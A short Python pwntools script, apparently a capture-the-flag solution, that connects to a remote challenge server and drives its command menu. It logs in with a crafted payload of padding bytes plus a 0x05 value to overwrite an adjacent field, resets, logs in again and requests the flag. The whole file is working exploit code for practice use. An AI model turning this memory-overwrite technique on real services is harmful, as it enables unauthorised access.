from pwn import *
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

p = remote('node4.buuoj.cn', 29378)

def get_flag():
    p.recvuntil(b'Enter your command:\n> ')
    p.sendline(b'get-flag')

def login(content: bytes):
    p.recvuntil(b'Enter your command:\n> ')
    p.sendline(b'login ' + content)

def reset():
    p.recvuntil(b'Enter your command:\n> ')
    p.sendline(b'reset')

payload = b'a'*0x8 + b'\x05'.ljust(8, b'\x00')

login(payload)
reset()
login(b'test')
get_flag()
p.interactive()